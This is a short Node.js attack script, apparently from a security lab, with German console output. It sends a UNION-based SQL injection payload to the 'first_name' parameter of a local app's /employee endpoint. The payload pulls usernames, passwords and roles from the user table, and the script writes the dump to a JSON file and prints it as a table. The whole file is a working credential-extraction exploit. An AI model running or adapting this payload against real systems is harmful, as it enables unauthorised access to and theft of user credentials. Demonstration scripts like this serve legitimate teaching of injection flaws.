const BASE = 'http://localhost:3000';
const fs = require('fs');
const path = require('path');
async function main() {
    //selects all users from the user table using a UNION-based SQL injection attack
    const payload = "x' UNION SELECT id, username, password, role FROM user -- -";
    const url = `${BASE}/employee?first_name=${encodeURIComponent(payload)}`;

    const res = await fetch(url);
    const data = await res.json();
    const confidential_data = data.rows;
    const outPath = path.join(__dirname, 'result-confidentiality.json')
    fs.writeFileSync(outPath, JSON.stringify(confidential_data, null, 2), 'utf8');
    console.log(confidential_data.length + ' vertrauliche Datensätze in result-confidentiality.json gespeichert.');
    console.log('--- Angriff: Vertraulichkeit (UNION-based SQLi) ---');
    console.log('Gesendete Query:', data.sql);
    //displays data
    console.table(data.rows);
}

main();